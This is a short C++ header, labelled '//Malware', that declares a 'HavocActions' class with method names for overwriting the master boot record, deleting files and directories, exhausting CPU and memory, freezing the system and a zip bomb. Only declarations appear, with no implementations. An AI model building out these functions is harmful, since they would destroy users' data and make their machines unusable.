#ifndef HAVOC_ACTIONS_H
#define HAVOC_ACTIONS_H
//Malware
class HavocActions {
    public:
      void overrideMBR();
      void removeFiles();
      void removeDirectories(); //merge
      void cpuOverloading();
      void memoryOverloading();
      void openEverything(); //make freeze
      void zipBomb();
}

#endif
